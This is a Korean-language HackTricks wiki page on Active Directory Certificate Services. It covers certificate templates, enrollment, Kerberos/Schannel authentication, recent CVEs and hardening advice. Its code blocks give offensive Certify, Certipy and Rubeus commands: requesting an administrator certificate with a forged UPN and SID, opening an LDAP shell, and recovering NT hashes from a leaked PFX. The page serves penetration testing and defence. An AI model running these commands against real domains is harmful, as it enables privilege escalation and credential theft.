# AD 인증서

{{#include ../../banners/hacktricks-training.md}}

## 소개

### 인증서 구성 요소

- 인증서의 **Subject**는 소유자를 나타냅니다.
- **Public Key**는 비공개로 보유한 키와 쌍을 이루어 인증서를 정당한 소유자와 연결합니다.
- **NotBefore** 및 **NotAfter** 날짜로 정의되는 **Validity Period**는 인증서의 유효 기간을 나타냅니다.
- Certificate Authority (CA)가 제공하는 고유한 **Serial Number**는 각 인증서를 식별합니다.
- **Issuer**는 인증서를 발급한 CA를 가리킵니다.
- **SubjectAlternativeName**은 Subject에 추가 이름을 허용하여 식별의 유연성을 높입니다.
- **Basic Constraints**는 인증서가 CA용인지 최종 개체용인지 식별하고 사용 제한을 정의합니다.
- **Extended Key Usages (EKUs)**는 Object Identifier (OID)를 통해 코드 서명이나 이메일 암호화 등 인증서의 구체적인 용도를 지정합니다.
- **Signature Algorithm**은 인증서 서명에 사용할 방식을 지정합니다.
- 발급자의 비공개 키로 생성되는 **Signature**는 인증서의 진위를 보장합니다.<sup>[[4]](#references)</sup>

### 특별 고려 사항

- **Subject Alternative Names (SANs)**는 인증서를 여러 ID에 사용할 수 있도록 확장하며, 여러 도메인을 사용하는 서버에 특히 중요합니다. 공격자가 SAN 사양을 조작해 사칭할 위험을 방지하려면 안전한 발급 절차가 필수입니다.<sup>[[4]](#references)</sup>

### Active Directory (AD)의 Certificate Authority (CA)

AD CS는 AD 포리스트의 CA 인증서를 지정된 컨테이너에서 관리하며, 각 컨테이너는 고유한 역할을 수행합니다:<sup>[[4]](#references)</sup>

- **Certification Authorities** 컨테이너에는 신뢰할 수 있는 루트 CA 인증서가 저장됩니다.
- **Enrolment Services** 컨테이너에는 Enterprise CA와 해당 인증서 템플릿 정보가 저장됩니다.
- **NTAuthCertificates** 개체에는 AD 인증에 사용할 수 있도록 승인된 CA 인증서가 포함됩니다.
- **AIA (Authority Information Access)** 컨테이너는 중간 CA 및 교차 CA 인증서를 사용한 인증서 체인 검증을 지원합니다.

### 인증서 획득: 클라이언트 인증서 요청 흐름

1. 클라이언트가 Enterprise CA를 찾으면서 요청 절차가 시작됩니다.
2. 공개 키와 기타 세부 정보를 포함하는 CSR은 공개 키와 비공개 키 쌍을 생성한 후 만들어집니다.
3. CA는 사용 가능한 인증서 템플릿을 기준으로 CSR을 평가하고, 템플릿의 권한에 따라 인증서를 발급합니다.
4. 승인되면 CA는 비공개 키로 인증서에 서명해 클라이언트에 반환합니다.<sup>[[4]](#references)</sup>

### 인증서 템플릿

AD에서 정의되는 이 템플릿은 인증서 발급을 위한 설정과 권한을 지정합니다. 여기에는 허용된 EKU, 등록 권한 및 수정 권한이 포함되며, 인증서 서비스에 대한 액세스 관리에 중요합니다.<sup>[[4]](#references)</sup>

**템플릿 스키마 버전이 중요합니다.** 레거시 **v1** 템플릿(예: 기본 제공 **WebServer** 템플릿)에는 최신 적용 제어 기능이 일부 없습니다. **ESC15/EKUwu** 연구에 따르면 **v1 템플릿**에서는 요청자가 CSR에 포함한 **Application Policies/EKUs**가 템플릿에 설정된 EKU보다 **우선 적용될 수** 있습니다. 따라서 등록 권한만으로 client-auth, enrollment agent 또는 code-signing 인증서를 발급받을 수 있습니다. **v2/v3 템플릿**을 사용하고, 기본 v1 템플릿을 제거하거나 대체하며, EKU의 범위를 의도된 용도로 엄격히 제한하세요.<sup>[[1]](#references)</sup>

## 인증서 등록

인증서 등록 절차는 관리자가 **인증서 템플릿을 생성**하면서 시작되며, 이후 Enterprise Certificate Authority (CA)가 템플릿을 **게시**합니다. 게시된 템플릿은 클라이언트 등록에 사용할 수 있습니다. 이를 위해 Active Directory 개체의 `certificatetemplates` 필드에 템플릿 이름을 추가합니다.<sup>[[4]](#references)</sup>

클라이언트가 인증서를 요청하려면 **등록 권한**이 부여되어야 합니다. 이 권한은 인증서 템플릿과 Enterprise CA 자체의 보안 설명자에 정의됩니다. 요청이 성공하려면 두 위치 모두에서 권한을 부여해야 합니다.<sup>[[4]](#references)</sup>

### 템플릿 등록 권한

이 권한은 다음과 같은 허용 여부를 지정하는 Access Control Entry (ACE)를 통해 설정합니다:<sup>[[4]](#references)</sup>

- 각각 특정 GUID와 연결된 **Certificate-Enrollment** 및 **Certificate-AutoEnrollment** 권한.
- 모든 확장 권한을 허용하는 **ExtendedRights**.
- 템플릿에 대한 전체 제어 권한을 제공하는 **FullControl/GenericAll**.

### Enterprise CA 등록 권한

CA의 권한은 Certificate Authority 관리 콘솔에서 확인할 수 있는 보안 설명자에 지정됩니다. 일부 설정에서는 권한이 낮은 사용자에게 원격 액세스도 허용하므로 보안 문제가 될 수 있습니다.<sup>[[4]](#references)</sup>

### 추가 발급 제어

다음과 같은 제어가 적용될 수 있습니다:<sup>[[4]](#references)</sup>

- **Manager Approval**: 인증서 관리자가 승인할 때까지 요청을 보류 상태로 둡니다.
- **Enrolment Agents and Authorized Signatures**: CSR에 필요한 서명 수와 필수 Application Policy OID를 지정합니다.

### 인증서 요청 방법

인증서는 다음 방법으로 요청할 수 있습니다:<sup>[[4]](#references)</sup>

1. DCOM 인터페이스를 사용하는 **Windows Client Certificate Enrollment Protocol** (MS-WCCE).
2. 명명된 파이프 또는 TCP/IP를 사용하는 **ICertPassage Remote Protocol** (MS-ICPR).
3. Certificate Authority Web Enrollment 역할이 설치된 경우 **인증서 등록 웹 인터페이스**.
4. Certificate Enrollment Policy (CEP) 서비스와 함께 사용하는 **Certificate Enrollment Service** (CES).
5. Simple Certificate Enrollment Protocol (SCEP)을 사용하는 네트워크 장치용 **Network Device Enrollment Service** (NDES).

Windows 사용자는 GUI(`certmgr.msc` 또는 `certlm.msc`)나 명령줄 도구(`certreq.exe` 또는 PowerShell의 `Get-Certificate` 명령)를 통해서도 인증서를 요청할 수 있습니다.

```bash
# Example of requesting a certificate using PowerShell
Get-Certificate -Template "User" -CertStoreLocation "cert:\\CurrentUser\\My"
```

## 인증서 인증

Active Directory(AD)는 주로 **Kerberos** 및 **Secure Channel (Schannel)** 프로토콜을 사용한 인증서 인증을 지원합니다.<sup>[[4]](#references)</sup>

### Kerberos 인증 프로세스

Kerberos 인증 프로세스에서 사용자의 티켓 부여 티켓(TGT) 요청은 사용자 인증서의 **개인 키**를 사용해 서명됩니다. 이 요청은 도메인 컨트롤러에서 여러 검증 절차를 거치며, 여기에는 인증서의 **유효성**, **경로**, **폐기 상태** 확인이 포함됩니다. 또한 인증서가 신뢰할 수 있는 출처에서 발급되었는지 검증하고 발급자가 **NTAUTH 인증서 저장소**에 있는지 확인합니다. 검증에 성공하면 TGT가 발급됩니다. AD의 **`NTAuthCertificates`** 객체는 다음 위치에 있습니다:

```bash
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<com>
```

인증서 인증을 위한 신뢰를 설정하는 데 핵심적인 역할을 합니다.<sup>[[4]](#references)</sup>

**KB5014754** 배포 이후, 최신 Kerberos 인증서 인증은 EKU뿐 아니라 **매핑 강도**가 주된 요소가 되었습니다.<sup>[[2]](#references)</sup> 보안이 강화된 포리스트에서는 다음과 같습니다.

- **UPN/DNS SAN**만 포함된 인증서는 더 이상 로그온에 충분하지 않을 수 있습니다.
- KDC는 일반적으로 **SID 보안 확장**(`1.3.6.1.4.1.311.25.2`) 또는 `altSecurityIdentities`의 강력한 명시적 매핑과 같은 **강력한 바인딩**을 선호합니다.
- 인증서에 강력한 매핑이 없으면, 호환성 모드에서 DC는 **Kdcsvc Event ID 39/41**을 기록하고 적용 모드에서는 인증을 거부합니다.
- 여러 공격 경로가 혼합된 경우, 발급된 인증서에서 SID 확장을 제거하는 **ESC9/ESC16**이 중요합니다. 이때 공격 경로가 지원한다면 공격자는 명시적 매핑이나 SAN URL SID 형식에 의존합니다.

### Secure Channel (Schannel) 인증

Schannel은 보안 TLS/SSL 연결을 지원합니다. 핸드셰이크 중 클라이언트가 인증서를 제시하고, 인증서가 성공적으로 검증되면 액세스가 허용됩니다.<sup>[[5]](#references)</sup> 인증서를 AD 계정에 매핑하는 방법에는 Kerberos의 **S4U2Self** 기능이나 인증서의 **Subject Alternative Name (SAN)** 등이 포함될 수 있습니다.<sup>[[4]](#references)</sup>

**PKINIT**을 사용할 수 없는 경우에도 Schannel은 실용적인 대체 수단입니다. 예를 들어 도메인 컨트롤러에 적합한 **Smart Card Logon** 인증서가 없으면 `certipy auth`/PKINIT 도구로 TGT를 가져오지 못할 수 있지만, 같은 인증서를 **LDAPS** 또는 **LDAP StartTLS**에 사용해 인증하고 LDAP 작업을 수행할 수는 있습니다.

### AD Certificate Services 열거

AD의 인증서 서비스는 LDAP 쿼리를 통해 열거할 수 있으며, 이 과정에서 **Enterprise Certificate Authorities (CAs)**와 해당 구성에 대한 정보를 확인할 수 있습니다. 도메인 인증을 받은 사용자라면 누구나 특별한 권한 없이 이 정보에 접근할 수 있습니다.<sup>[[4]](#references)</sup> **[Certify](https://github.com/GhostPack/Certify)** 및 **[Certipy](https://github.com/ly4k/Certipy)** 같은 도구는 AD CS 환경의 열거 및 취약점 평가에 사용됩니다.<sup>[[6]](#references)</sup>

이러한 도구의 사용 명령은 다음과 같습니다:

```bash
# Enumerate trusted root CA certificates, Enterprise CAs, and web endpoints
Certify.exe cas

# Identify vulnerable templates and dump relevant permissions
Certify.exe find /vulnerable
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /showAdmins

# Certipy 5.x enumeration focused on enabled/vulnerable templates
certipy find -enabled -vulnerable -hide-admins -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Save JSON/CSV output for offline review or BloodHound correlation
certipy find -json -output corp_adcs -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Request a certificate over the Web Enrollment endpoint or DCOM/RPC
certipy req -web -ca corp-CA -target ca.corp.local -template WebServer -upn john@corp.local -dns www.corp.local
certipy req -ca corp-CA -target ca.corp.local -template User -upn administrator@corp.local -sid S-1-5-21-...-500

# Use the issued certificate either for PKINIT or directly for LDAP Schannel auth
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

### Rubeus를 사용한 Certify 열거 플래그 및 PKINIT

다음 Certify 명령어 변형은 각각 고유한 필터와 출력 옵션을 유지합니다.<sup>[[6]](#references)</sup>

```bash
# Enumerate trusted root CA certificates, Enterprise CAs and HTTP enrollment endpoints
# Useful flags: /domain, /path, /hideAdmins, /showAllPermissions, /skipWebServiceChecks
Certify.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks]

# Identify vulnerable certificate templates and filter for common abuse cases
Certify.exe find
Certify.exe find /vulnerable [/currentuser]
Certify.exe find /enrolleeSuppliesSubject   # ESC1 candidates (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
Certify.exe find /clientauth                # templates with client-auth EKU
Certify.exe find /showAllPermissions        # include template ACLs in output
Certify.exe find /json /outfile:C:\Temp\adcs.json

# Enumerate PKI object ACLs (Enterprise PKI container, templates, OIDs) – useful for ESC4/ESC7 discovery
Certify.exe pkiobjects [/domain:domain.local] [/showAdmins]

# Use Certipy for enumeration and identifying vulnerable templates
certipy find -vulnerable -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

Rubeus는 암호로 보호된 PFX 인증서를 사용해 PKINIT 인증을 수행하고 TGT를 요청할 수도 있습니다. 선택적 `/getcredentials` 스위치는 U2U 서비스 티켓을 요청하고 계정 NT 해시를 복구하려고 시도합니다:<sup>[[7]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:<USER> /certificate:C:\temp\leaked.pfx /password:<PFX_PASSWORD> /getcredentials /ptt
```

ESC 관련 template 및 CA 악용에 대해서는 [AD CS Domain Escalation](ad-certificates/domain-escalation.md)을 참조하세요.

---

## 최근 취약점 및 보안 업데이트 (2022-2025)

| 연도 | ID / 이름 | 영향 | 주요 요점 |
|------|-----------|------|----------------|
| 2022 | **CVE-2022-26923** – “Certifried” / ESC6 | PKINIT 중 machine account 인증서를 스푸핑하여 *권한 상승*이 가능합니다. | 패치는 **2022년 5월 10일** 보안 업데이트에 포함되어 있습니다. 감사 및 strong-mapping 제어는 **KB5014754**를 통해 도입되었습니다. 이제 환경은 *Full Enforcement* 모드여야 합니다.  |
| 2023 | **CVE-2023-35350 / 35351** | AD CS Web Enrollment (certsrv) 및 CES 역할의 *원격 코드 실행* 취약점입니다. | 공개 PoC는 제한적이지만, 취약한 IIS 구성 요소는 내부에 노출된 경우가 많습니다. **2023년 7월** Patch Tuesday 업데이트를 적용하세요.  |
| 2024 | **CVE-2024-49019** – “EKUwu” / ESC15 | **v1 template**에서 등록 권한이 있는 요청자는 CSR에 **Application Policies/EKUs**를 포함할 수 있으며, 이는 template EKUs보다 우선되어 client-auth, enrollment agent 또는 code-signing 인증서를 발급받을 수 있습니다. | **2024년 11월 12일** 기준 패치가 제공되었습니다. v1 template(예: 기본 WebServer)을 교체하거나 대체하고, EKUs를 용도에 맞게 제한하며, 등록 권한을 제한하세요. |

### Microsoft 보안 강화 타임라인 (KB5014754)

Microsoft는 Kerberos 인증서 인증에서 취약한 암시적 매핑을 제거하기 위해 3단계(Compatibility → Audit → Enforcement) 배포를 도입했습니다. **2025년 2월 11일**부터 `StrongCertificateBindingEnforcement` 레지스트리 값이 설정되지 않은 경우 도메인 컨트롤러는 자동으로 **Full Enforcement**로 전환됩니다. 이후 Microsoft는 **2025년 9월 9일** 보안 업데이트까지 호환성 모드로 되돌릴 수 있도록 타임라인을 업데이트했습니다.<sup>[[2]](#references)</sup> 관리자는 다음을 수행해야 합니다.

1. 모든 DC와 AD CS 서버에 패치를 적용합니다(2022년 5월 이후 업데이트).
2. *Audit* 단계에서 취약한 매핑이 발생하는지 Event ID 39/41을 모니터링합니다.
3. Enforcement가 취약한 매핑을 차단하기 전에 새 **SID extension**을 사용해 client-auth 인증서를 재발급하거나 강력한 수동 매핑을 구성합니다.

### 보안이 강화된 포리스트에서의 운영자 참고 사항

- **2025년 이후 환경에서는 ESC1/ESC6만으로 전체 공격을 설명할 수 없습니다.** 다른 주체의 인증서를 요청하는 경우 대개 SID extension 또는 명시적 매핑과 같은 강력한 매핑 요소도 필요합니다.
- **ESC15 (EKUwu)**는 패치되지 않은 환경에서 주로 유용합니다. **Application Policies**를 삽입해 WebServer 같은 무해한 **v1** template을 인증 또는 enrollment-agent 기능이 있는 인증서로 바꿀 수 있습니다. Kerberos PKINIT은 여전히 EKUs를 평가하지만, **LDAP Schannel**도 Application Policies를 따르므로 LDAP 기반 악용은 여전히 가능합니다.<sup>[[1]](#references)</sup>
- **ESC16**은 CA 전체에 적용되는 설정입니다. CA에서 SID security extension을 전역적으로 비활성화하면, 공격 체인에서 다른 지원 형식을 이용해 SID를 삽입하지 않는 한 발급되는 모든 인증서는 취약한 매핑 동작으로 되돌아갑니다.
- **ESC7 권한은 서로 다릅니다:** CA의 `ManageCA` 권한 부여는 `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6)와 같은 설정을 변경할 수 있게 하는 반면, `ManageCertificates`는 요청 승인을 제어합니다. 인증서 관리자 권한에 명시적인 Deny가 있으면 Allow도 함께 설정되어 있어도 해당 승인 경로가 차단될 수 있습니다. 설정과 template을 연계하기 전에 실효 CA ACL을 확인하세요. [Microsoft의 CA ACL 평가](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-vulnerable-ca-setting)를 참조하세요.

---

## 탐지 및 보안 강화 개선 사항

* **Defender for Identity AD CS sensor (2023-2024)**는 이제 ESC1-ESC8/ESC11에 대한 보안 상태 평가를 제공하고, *“비 DC에 대한 도메인 컨트롤러 인증서 발급”* (ESC8) 및 *“임의의 Application Policies를 사용한 인증서 등록 방지”* (ESC15)와 같은 실시간 경고를 생성합니다. 이러한 탐지 기능을 활용하려면 모든 AD CS 서버에 sensor를 배포하세요.<sup>[[3]](#references)</sup>
* 모든 template에서 **“Supply in the request”** 옵션을 비활성화하거나 범위를 엄격히 제한하세요. SAN/EKU 값을 명시적으로 정의하는 것이 좋습니다.
* 반드시 필요한 경우가 아니라면 template에서 **Any Purpose** 또는 **No EKU**를 제거하세요(ESC2 시나리오 완화).
* 민감한 template(예: WebServer / CodeSigning)에는 **manager approval** 또는 전용 Enrollment Agent 워크플로를 요구하세요.
* 웹 등록(`certsrv`) 및 CES/NDES endpoint를 신뢰할 수 있는 네트워크로 제한하거나 client-certificate 인증을 적용하세요.
* RPC relay인 ESC11을 완화하려면 RPC 등록 암호화를 강제하세요 (`certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST`). 이 플래그는 **기본적으로 활성화되어 있지만**, 레거시 클라이언트 때문에 비활성화되는 경우가 많아 relay 위험이 다시 발생할 수 있습니다.
* **IIS 기반 등록 endpoint** (CES/Certsrv)를 보호하세요. 가능하면 NTLM을 비활성화하거나 HTTPS와 Extended Protection을 요구해 ESC8 relay를 차단하세요.

CA를 실행하는 호스트에서 ESC11을 평가하세요. 이 호스트는 도메인 컨트롤러가 아니라 도메인 구성원 서버일 수도 있습니다. 활성 CA의 `InterfaceFlags`를 `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration`에서 확인하세요. 값을 읽을 수 없거나 값이 없으면 결과는 알 수 없는 것이며, RPC 암호화가 비활성화되었다는 증거가 아닙니다. `IF_ENFORCEENCRYPTICERTREQUEST` 비트가 설정되어 있지 않으면 구성 점검의 단서가 되지만, 실제로 악용하려면 접근 가능한 등록 RPC endpoint, 유도 가능한 자격 증명 및 사용 가능한 인증서 template도 필요합니다. ESC8의 경우 HTTP NTLM challenge만으로는 충분하지 않습니다. 작동하는 등록 endpoint가 있는지 확인하세요.

---

## References

- [1] [EKUwu: 또 하나의 AD CS ESC만은 아니다](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [2] [KB5014754: Windows 도메인 컨트롤러의 인증서 기반 인증 변경 사항](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [3] [인증서 보안 상태 평가 - Microsoft Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates)
- [4] [Certified Pre-Owned: Active Directory Certificate Services 악용](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [5] [SSL/TLS Client Authentication이란 무엇이며 어떻게 작동하나요?](https://comodosslstore.com/blog/what-is-ssl-tls-client-authentication-how-does-it-work.html)
- [6] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [7] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
{{#include ../../banners/hacktricks-training.md}}
